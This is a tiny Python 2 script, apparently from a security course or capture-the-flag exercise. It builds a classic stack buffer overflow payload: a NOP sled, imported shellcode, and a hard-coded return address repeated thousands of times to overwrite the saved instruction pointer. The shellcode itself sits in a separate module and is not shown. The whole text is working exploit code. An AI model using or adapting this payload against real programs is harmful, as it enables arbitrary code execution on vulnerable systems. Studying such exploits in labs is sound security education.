# ehh... 9000+ should be enough to overwrite $eip in all cases. If it doesn't work just do it again and buy a lottery ticket. :)

from shellcode import shellcode

print "\x90"* 989 + shellcode + "\xf8\xe2\xfe\xbf"*9001 

